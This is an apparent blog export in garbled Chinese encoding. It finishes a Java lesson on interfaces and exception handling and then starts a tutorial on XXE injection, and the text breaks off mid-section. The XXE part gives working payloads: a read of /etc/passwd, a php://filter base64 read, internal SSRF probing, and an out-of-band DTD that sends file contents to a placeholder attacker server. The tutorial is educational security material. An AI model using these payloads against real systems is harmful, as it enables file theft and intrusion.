title="æ¥å£(Interface)"></a>æ¥å£(Interface)</h2><p>æ¥å£æ˜¯ç±»ä¼¼äºä¸€ç§åˆçº¦ï¼Œæ¥å£å†…éƒ¨å®šä¹‰äº†ä¸€äº›åˆ—çš„æŠ½è±¡æ–¹æ³•ï¼Œå½“å®ç°ç±»é‡‡ç”¨äº†æŸä¸€ä¸ªæ¥å£å°±å¿…é¡»å®ç°è¯¥æ¥å£ä¸­çš„æ‰€æœ‰æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ”¯ä»˜æ¥å£ï¼ŒåŒ…å«é»˜è®¤æ–¹æ³•</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">PaymentProcessor</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æŠ½è±¡æ–¹æ³•ï¼šå¤„ç†æ”¯ä»˜ï¼ˆå¿…é¡»ç”±å®ç°ç±»å®ç°ï¼‰</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">processPayment</span><span class="params">(<span class="type">double</span> amount)</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æŠ½è±¡æ–¹æ³•ï¼šè·å–æ”¯ä»˜æ–¹å¼åç§°</span></span><br><span class="line">    String <span class="title function_">getPaymentMethod</span><span class="params">()</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// é»˜è®¤æ–¹æ³•ï¼šç”Ÿæˆäº¤æ˜“IDï¼ˆæ‰€æœ‰æ”¯ä»˜æ–¹å¼é€šç”¨çš„é€»è¾‘ï¼‰</span></span><br><span class="line">    <span class="keyword">default</span> String <span class="title function_">generateTransactionId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> <span class="string">&quot;TXN&quot;</span> + System.currentTimeMillis() + (<span class="type">int</span>)(Math.random() * <span class="number">1000</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;ç”Ÿæˆçš„äº¤æ˜“ID: &quot;</span> + id);</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// é™æ€æ–¹æ³•ï¼šè·å–æ”¯æŒçš„è´§å¸</span></span><br><span class="line">    <span class="keyword">static</span> String[] getSupportedCurrencies() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;CNY&quot;</span>, <span class="string">&quot;USD&quot;</span>, <span class="string">&quot;EUR&quot;</span>, <span class="string">&quot;JPY&quot;</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Java8ä»¥åï¼Œæ¥å£ä¸­å¯ä»¥æœ‰é»˜è®¤æ–¹æ³•ï¼Œé»˜è®¤æ–¹æ³•å¯ä»¥å…·æœ‰æ–¹æ³•ä½“</p></blockquote><h3 id="æ¥å£æ•°ç»„"><a href="#æ¥å£æ•°ç»„" class="headerlink" title="æ¥å£æ•°ç»„"></a>æ¥å£æ•°ç»„</h3><p>æ¥å£æ•°ç»„å¯ä»¥å®¹çº³è°ƒç”¨äº†è¯¥æ¥å£çš„å®ç°ç±»çš„å®ä¾‹åŒ–å¯¹è±¡</p> <br/><h2 id="å¼‚å¸¸å¤„ç†"><a href="#å¼‚å¸¸å¤„ç†" class="headerlink" title="å¼‚å¸¸å¤„ç†"></a>å¼‚å¸¸å¤„ç†</h2><p>å¼‚å¸¸æ˜¯ç¨‹åºä¸­å¯èƒ½ä¸­æ–­ç¨‹åºè¿è¡Œçš„äº‹ä»¶ï¼Œå¼‚å¸¸å¤„ç†å¯ä»¥é¢„å…ˆè®¾ç½®å¥½å¼‚å¸¸çš„å¤„ç†æ–¹æ³•ï¼Œå¼‚å¸¸å‘ç”Ÿæ—¶ç¨‹åºå¯ä»¥æ­£å¸¸è¿è¡Œ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:æ‰§è¡Œå¯èƒ½äº§ç”Ÿå¼‚å¸¸çš„ä»£ç </span><br><span class="line"><span class="keyword">catch</span>:æ•è·å¼‚å¸¸</span><br><span class="line"><span class="keyword">finally</span>:æ— è®ºæ˜¯å¦å‘ç”Ÿå¼‚å¸¸ï¼Œä»£ç æ€»èƒ½æ‰§è¡Œ</span><br><span class="line"><span class="keyword">throws</span>:å£°æ˜æ–¹æ³•å¯èƒ½è¦æŠ›å‡ºçš„å¼‚å¸¸ï¼Œè¦æ±‚è°ƒç”¨è€…å¤„ç†</span><br><span class="line"><span class="keyword">throw</span>:æ‰‹åŠ¨æŠ›å‡ºå¼‚å¸¸</span><br></pre></td></tr></table></figure><h3 id="å¼‚å¸¸å¯¹è±¡-Exception"><a href="#å¼‚å¸¸å¯¹è±¡-Exception" class="headerlink" title="å¼‚å¸¸å¯¹è±¡(Exception)"></a>å¼‚å¸¸å¯¹è±¡(Exception)</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Throwable (æ‰€æœ‰å¼‚å¸¸/é”™è¯¯çš„è¶…ç±»)</span><br><span class="line">    â”œâ”€â”€ Error (ä¸¥é‡é”™è¯¯ï¼Œç¨‹åºæ— æ³•å¤„ç†)</span><br><span class="line">    â”‚    â”œâ”€â”€ OutOfMemoryError</span><br><span class="line">    â”‚    â”œâ”€â”€ StackOverflowError</span><br><span class="line">    â”‚    â””â”€â”€ ...</span><br><span class="line">    â”‚</span><br><span class="line">    â””â”€â”€ Exception (ç¨‹åºå¯ä»¥å¤„ç†çš„å¼‚å¸¸)</span><br><span class="line">         â”œâ”€â”€ RuntimeException (è¿è¡Œæ—¶å¼‚å¸¸ï¼Œéå—æ£€å¼‚å¸¸)</span><br><span class="line">         â”‚    â”œâ”€â”€ NullPointerException</span><br><span class="line">         â”‚    â”œâ”€â”€ IndexOutOfBoundsException</span><br><span class="line">         â”‚    â”œâ”€â”€ ArithmeticException</span><br><span class="line">         â”‚    â””â”€â”€ ...</span><br><span class="line">         â”‚</span><br><span class="line">         â””â”€â”€ å…¶ä»–Exception (å—æ£€å¼‚å¸¸ï¼Œç¼–è¯‘æŠ¥é”™)</span><br><span class="line">              â”œâ”€â”€ IOException</span><br><span class="line">              â”œâ”€â”€ SQLException</span><br><span class="line">              â””â”€â”€ ...</span><br></pre></td></tr></table></figure><p> å¼‚å¸¸çš„æœ¬è´¨ä¹Ÿæ˜¯ä¸€ç§å¯¹è±¡</p><table><thead><tr><th>å¼‚å¸¸å¯¹è±¡</th><th>æè¿°</th></tr></thead><tbody><tr><td>InputMismatchException</td><td>ç±»å‹å¼‚å¸¸</td></tr><tr><td>ArithmeticException</td><td>ç®—æ•°å¼‚å¸¸</td></tr><tr><td>Exception</td><td>å…¶ä»–å¼‚å¸¸</td></tr></tbody></table><p>å¼‚å¸¸ä¹Ÿæœ‰è‡ªå·±çš„æ–¹æ³•</p><table><thead><tr><th>å¼‚å¸¸æ–¹æ³•</th><th>æè¿°</th></tr></thead><tbody><tr><td>void printStackTrace()</td><td>è¾“å‡ºå¼‚å¸¸çš„å †æ ˆä¿¡æ¯</td></tr><tr><td>String getMessage()</td><td>è¿”å›å¼‚å¸¸ä¿¡æ¯çš„æè¿°å­—ç¬¦ä¸²ï¼Œæ˜¯printStackTrace()è¾“å‡ºçš„ä¸€éƒ¨åˆ†</td></tr></tbody></table><h3 id="try-catch-finallyç»“æ„"><a href="#try-catch-finallyç»“æ„" class="headerlink" title="try-catch-finallyç»“æ„"></a>try-catch-finallyç»“æ„</h3><p><code>try</code>ä¸­æ— å¼‚å¸¸ï¼Œç›´æ¥æ‰§è¡Œ<code>finally</code>ï¼Œè‹¥<code>try</code>ä¸­æœ‰å¼‚å¸¸ï¼Œå†åˆ°<code>catch</code>å†…å¯¹å¼‚å¸¸è¿›è¡Œå¤„ç†ï¼Œæœ€åæ‰§è¡Œ<code>finally</code>ï¼Œ<code>finally</code>é€šå¸¸éƒ½ä¼šæ‰§è¡Œ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimplestTryCatch</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// åœºæ™¯ï¼šè®¡ç®—ä¸¤ä¸ªæ•°çš„é™¤æ³•</span></span><br><span class="line">        calculateDivision(<span class="number">10</span>, <span class="number">2</span>);   <span class="comment">// æ­£å¸¸</span></span><br><span class="line">        calculateDivision(<span class="number">10</span>, <span class="number">0</span>);   <span class="comment">// é™¤ä»¥é›¶</span></span><br><span class="line">        calculateDivision(<span class="number">10</span>, <span class="string">&quot;abc&quot;</span>); <span class="comment">// ç±»å‹é”™è¯¯</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">calculateDivision</span><span class="params">(<span class="type">int</span> a, Object b)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;\nè®¡ç®— &quot;</span> + a + <span class="string">&quot; / &quot;</span> + b);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// å°è¯•è½¬æ¢ä¸ºæ•°å­—</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">divisor</span> <span class="operator">=</span> Integer.parseInt(b.toString());</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// è®¡ç®—é™¤æ³•</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> a / divisor;</span><br><span class="line">            System.out.println(<span class="string">&quot;ç»“æœï¼š&quot;</span> + result);</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (ArithmeticException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;é”™è¯¯ï¼šé™¤æ•°ä¸èƒ½ä¸º0&quot;</span>);</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NumberFormatException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;é”™è¯¯ï¼š&quot;</span> + b + <span class="string">&quot; ä¸æ˜¯æœ‰æ•ˆçš„æ•°å­—&quot;</span>);</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;æœªçŸ¥é”™è¯¯ï¼š&quot;</span> + e.getMessage());</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;è®¡ç®—å®Œæˆ&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>å¤šä¸ª<code>catch</code>å¹¶åˆ—æ’å¼€ç§°ä¸º<code>å¤šè·¯å¼‚å¸¸æ•è·</code>ï¼Œè¿™æ ·å¯ä»¥å…¨é¢ç²¾å‡†åœ°æ•è·å¼‚å¸¸ï¼Œé€šå¸¸æ•è·çš„å¼‚å¸¸ä»å­ç±»åˆ°çˆ¶ç±»ï¼Œåªæ‰§è¡Œç¬¬ä¸€ä¸ªä¸å¼‚å¸¸åŒ¹é…çš„<code>catch</code>è¯­å¥</p></blockquote> <br/>]]></content>
      
      
      <categories>
          
          <category> é›¶ç¢ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¤–éƒ¨å®ä½“æ³¨å…¥(XXE)</title>
      <link href="/2025/11/28/%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5(XXE)/"/>
      <url>/2025/11/28/%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5(XXE)/</url>
      
        <content type="html"><![CDATA[<h1 id="å¤–éƒ¨å®ä½“æ³¨å…¥-XXE"><a href="#å¤–éƒ¨å®ä½“æ³¨å…¥-XXE" class="headerlink" title="å¤–éƒ¨å®ä½“æ³¨å…¥(XXE)"></a>å¤–éƒ¨å®ä½“æ³¨å…¥(XXE)</h1><p>XXE(XML External Entity Injection)æ¼æ´æ˜¯ä¸€ç§å¸¸è§çš„ç½‘ç»œå®‰å…¨æ¼æ´ï¼Œå®ƒå…è®¸æ”»å‡»è€…å¯¹åº”ç”¨ç¨‹åºå¤„ç†XMLæ•°æ®çš„è¿‡ç¨‹è¿›è¡Œå¹²é¢„ã€‚è¿™ç§æ¼æ´çš„åˆ©ç”¨å¯ä»¥å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼ˆSSRFï¼‰ã€å†…ç½‘ç«¯å£æ‰«æç­‰ä¸€ç³»åˆ—å®‰å…¨é—®é¢˜</p><br/><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p><strong>XML(EXtensible Markup Lannguange)å¯æ‰©å±•æ ‡è®°è¯­è¨€</strong>ï¼Œè¢«è®¾è®¡ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹æ–‡æœ¬</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">catalog</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">company</span> <span class="string">&quot;TechCorp&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">year</span> <span class="string">&quot;2023&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">products</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;products.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;company;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span><span class="symbol">&amp;year;</span><span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">product</span> <span class="attr">id</span>=<span class="string">&quot;P001&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>Laptop<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">price</span>&gt;</span>999<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">product</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">external-data</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;products;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">external-data</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">info</span>&gt;</span>Sample XML for structure analysis<span class="tag">&lt;/<span class="name">info</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br></pre></td></tr></table></figure><p>xmlæ–‡æœ¬ä¸»è¦æ˜¯ç”±ä¸€å †æ ‡ç­¾å’Œå†…å®¹æ„æˆçš„ç»“æ„åŒ–æ•°æ®ï¼Œxmlå¯ä»¥å¼•å…¥å¤–éƒ¨å®ä½“çš„ç‰¹æ€§æ˜¯äº§ç”Ÿäº†XXEæ¼æ´çš„ä¸»è¦åŸå› ï¼Œåœ¨è¿™é‡Œå¼•å…¥å®ä½“çš„éƒ¨åˆ†æ˜¯</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">catalog</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">company</span> <span class="string">&quot;TechCorp&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">year</span> <span class="string">&quot;2023&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">products</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;products.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>åç»­åœ¨æ–‡ä¸­ä½¿ç”¨<code>&amp;company;</code>ã€<code>&amp;year;</code>ã€<code>&amp;products;</code>å°±ç­‰åŒäºä½¿ç”¨äº†<code>&quot;TechCorp&quot;</code>ã€<code>&quot;2023&quot;</code>å’Œ<code>products.xml</code>é‡Œé¢çš„å†…å®¹</p><br/><h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><p>DTDï¼ˆæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰çš„ä½œç”¨æ˜¯å®šä¹‰ XML æ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ï¼Œå®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ã€‚å®ä½“åˆ†ä¸ºå†…éƒ¨å®ä½“å’Œå¤–éƒ¨å®ä½“</p><p><strong>å®ä½“å£°æ˜ï¼š</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY %entity0 <span class="string">&quot;value&quot;</span>&gt;</span> //å†…éƒ¨å£°æ˜</span><br><span class="line"><span class="meta">&lt;!ENTITY %entity1 <span class="keyword">SYSTEM</span> <span class="string">&quot;http://123.45.67.89/file&quot;</span>&gt;</span> //å¤–éƒ¨å£°æ˜</span><br></pre></td></tr></table></figure><br/><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><table><thead><tr><th align="left">æ”»å‡»ç±»å‹</th><th align="left">Payload</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">æ–‡ä»¶è¯»å–</td><td align="left"><code>&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</code> ç„¶ååœ¨XMLä¸­å¼•ç”¨ <code>&amp;xxe;</code></td><td align="left">åˆ©ç”¨ <code>file://</code> åè®®è¯»å–ç³»ç»Ÿæ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶å†…å®¹å«æœ‰ç‰¹æ®ŠXMLå­—ç¬¦ï¼Œå¯èƒ½å¯¼è‡´è§£æé”™è¯¯</td></tr><tr><td align="left">å†…ç½‘æ¢æµ‹ (SSRF)</td><td align="left"><code>&lt;!ENTITY xxe SYSTEM &quot;http://192.168.1.1:8080/&quot;&gt;</code></td><td align="left">åˆ©ç”¨å¤–éƒ¨å®ä½“è¯·æ±‚è§¦å‘XMLè§£æå™¨å‘<strong>å†…ç½‘ç³»ç»Ÿ</strong>å‘é€HTTPè¯·æ±‚ï¼Œæ ¹æ®å“åº”æ—¶é—´æˆ–é”™è¯¯ä¿¡æ¯åˆ¤æ–­ç«¯å£&#x2F;æœåŠ¡çŠ¶æ€</td></tr><tr><td align="left">æ— å›æ˜¾æ•°æ®å¤–å¸¦</td><td align="left">åœ¨VPSæ”¾ç½®æ¶æ„DTDï¼ˆå¦‚ <code>evil.dtd</code>ï¼‰ï¼š <code>&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</code> <code>&lt;!ENTITY % eval &quot;&lt;!ENTITY % exfil SYSTEM &#39;http://your-vps.com/?%file;&#39;&gt;&quot;&gt;</code> <code>%eval; %exfil;</code> <br />æäº¤Payloadå¼•ç”¨è¯¥DTDï¼š <code>&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;http://your-vps.com/evil.dtd&quot;&gt; %xxe;]&gt;</code></td><td align="left">é€šè¿‡<strong>å‚æ•°å®ä½“</strong>å°†ç›®æ ‡æ–‡ä»¶å†…å®¹æ‹¼æ¥åˆ°å‘é€ç»™æ”»å‡»è€…æœåŠ¡å™¨çš„URLä¸­ã€‚æŸ¥çœ‹æœåŠ¡å™¨è®¿é—®æ—¥å¿—å³å¯è·å–æ–‡ä»¶å†…å®¹</td></tr><tr><td align="left">åŸºäºé”™è¯¯çš„æ–‡ä»¶è¯»å–</td><td align="left">åœ¨VPSæ”¾ç½®æ¶æ„DTDï¼ˆå¦‚ <code>error.dtd</code>ï¼‰ï¼š <code>&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</code> <code>&lt;!ENTITY % eval &quot;&lt;!ENTITY % error SYSTEM &#39;file:///nonexistent/%file;&#39;&gt;&quot;&gt;</code> <code>%eval; %error;</code> <br />æäº¤Payloadå¼•ç”¨è¯¥DTD</td><td align="left">é€šè¿‡å°†æ–‡ä»¶å†…å®¹æ³¨å…¥åˆ°ä¸€ä¸ª<strong>ä¸å­˜åœ¨çš„è·¯å¾„</strong>ä¸­ï¼Œè§¦å‘è§£æé”™è¯¯ï¼Œä»è€Œåœ¨<strong>é”™è¯¯ä¿¡æ¯</strong>ä¸­å›æ˜¾æ–‡ä»¶å†…å®¹</td></tr></tbody></table><h3 id="æ–‡ä»¶è¯»å–"><a href="#æ–‡ä»¶è¯»å–" class="headerlink" title="æ–‡ä»¶è¯»å–"></a>æ–‡ä»¶è¯»å–</h3><p>è¿™ç§æ”»å‡»çš„æ ¸å¿ƒåœ¨äºï¼ŒXMLè§£æå™¨åœ¨å¤„ç†æˆ‘ä»¬å£°æ˜çš„å¤–éƒ¨å®ä½“æ—¶ï¼Œä¼šå»è¯»å–<code>SYSTEM</code>å…³é”®å­—åé¢æŒ‡å®šçš„URIæ‰€æŒ‡å‘çš„èµ„æºï¼Œä¸€ä¸ªå…¸å‹çš„æœ‰å›æ˜¾æ–‡ä»¶è¯»å–Payloadå¦‚ä¸‹ï¼š</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">content</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">content</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong><code>&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></strong>ï¼šè¿™è¡Œä»£ç åœ¨DTDå†…éƒ¨å®šä¹‰äº†ä¸€ä¸ªåä¸º<code>xxe</code>çš„å¤–éƒ¨å®ä½“ï¼Œè¿™ä¸ªå®ä½“æŒ‡å‘ç³»ç»Ÿä¸Šçš„<code>/etc/passwd</code>æ–‡ä»¶</p><p><strong><code>&amp;xxeï¼›</code></strong>ï¼šåœ¨XMLæ–‡æ¡£ä¸­ï¼Œé€šè¿‡<code>&amp;å®ä½“å;</code>çš„æ ¼å¼å¼•ç”¨è¿™ä¸ªå®ä½“ã€‚å½“XMLè§£æå™¨å¤„ç†åˆ°æ­¤å¤„æ—¶ï¼Œä¼šç”¨<code>/etc/passwd</code>æ–‡ä»¶çš„å†…å®¹æ›¿æ¢<code>&amp;xxe;</code></p><p>å¦‚æœæ–‡ä»¶å†…å®¹åŒ…å«åƒ<code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>è¿™ç±»åœ¨XMLä¸­æœ‰ç‰¹æ®Šæ„ä¹‰çš„å­—ç¬¦ï¼Œè§£æå™¨å¯èƒ½ä¼šæŠ¥é”™ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¸¸å¸¸é…åˆä½¿ç”¨<strong>PHPåŒ…è£…å™¨</strong>ï¼ˆå¦‚æœç›®æ ‡ç¯å¢ƒæ˜¯PHPï¼‰è¿›è¡ŒBase64ç¼–ç ï¼š</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·è¯»å‡ºçš„å†…å®¹ä¼šæ˜¯Base64ç¼–ç åçš„ï¼Œå¯ä»¥é¿å…ç‰¹æ®Šå­—ç¬¦é—®é¢˜ï¼Œä¹‹åéœ€è¦å†æ‰‹åŠ¨è§£ç </p><br/><h3 id="å†…ç½‘æ¢æµ‹"><a href="#å†…ç½‘æ¢æµ‹" class="headerlink" title="å†…ç½‘æ¢æµ‹"></a>å†…ç½‘æ¢æµ‹</h3><p>è¿™ç§æ”»å‡»æ–¹å¼æœ¬è´¨ä¸Šæ˜¯åˆ©ç”¨XXEå‘èµ·SSRFæ”»å‡»ï¼Œè®©XMLè§£æå™¨æˆä¸ºæˆ‘ä»¬æ¢æµ‹å†…ç½‘çš„â€æ¢é’ˆâ€ï¼Œä¸€ä¸ªåŸºæœ¬çš„æ¢æµ‹Payloadå¦‚ä¸‹ï¼š</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://192.168.1.1:8080/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">status</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">status</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å½“XMLè§£æå™¨å¤„ç†<code>&amp;xxe;</code>æ—¶ï¼Œä¼šå°è¯•è®¿é—®<code>http://192.168.1.1:8080/</code></p><p>æ ¹æ®å“åº”æ—¶é—´ã€è¿”å›å†…å®¹ï¼ˆå¦‚æœå›æ˜¾ï¼‰æˆ–é”™è¯¯ä¿¡æ¯ï¼ˆå¦‚è¿æ¥æ‹’ç»ã€è¶…æ—¶ç­‰ï¼‰ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ¨æ–­è¯¥IPçš„80ç«¯å£æ˜¯å¦å¼€æ”¾ï¼Œæˆ–è€…ç›¸åº”æœåŠ¡æ˜¯å¦å­˜åœ¨ï¼Œåœ¨å®é™…æ¸—é€æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦å…ˆè¯»å–æœåŠ¡å™¨çš„ç½‘ç»œé…ç½®æ–‡ä»¶ï¼ˆå¦‚<code>/etc/network/interfaces</code>ã€<code>/proc/net/arp</code>æˆ–<code>/etc/hosts</code>ï¼‰æ¥è·å–å†…ç½‘ç½‘æ®µä¿¡æ¯ï¼Œç„¶åå†è¿›è¡Œç³»ç»Ÿçš„ç«¯å£æˆ–æœåŠ¡æ¢æµ‹</p><br/><h3 id="æ— å›æ˜¾æ•°æ®å¤–å¸¦"><a href="#æ— å›æ˜¾æ•°æ®å¤–å¸¦" class="headerlink" title="æ— å›æ˜¾æ•°æ®å¤–å¸¦"></a>æ— å›æ˜¾æ•°æ®å¤–å¸¦</h3><p>ç”±äºæ•°æ®ä¸ä¼šç›´æ¥æ˜¾ç¤ºåœ¨è¿”å›çš„é¡µé¢ä¸Šï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡<strong>å‚æ•°å®ä½“</strong>æ„å»ºä¸€æ¡å¤–å¸¦ é€šé“ï¼Œå°†æ•°æ®å¤–å¸¦å‡ºæ¥ï¼Œçœ‹çœ‹å…·ä½“çš„Payloadï¼š</p><p><strong>æ”»å‡»è€…åœ¨VPSä¸Šæ”¾ç½®çš„æ¶æ„DTDæ–‡ä»¶</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;http://123.45.67.89/?file=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfil;</span><br></pre></td></tr></table></figure><p><strong><code>% 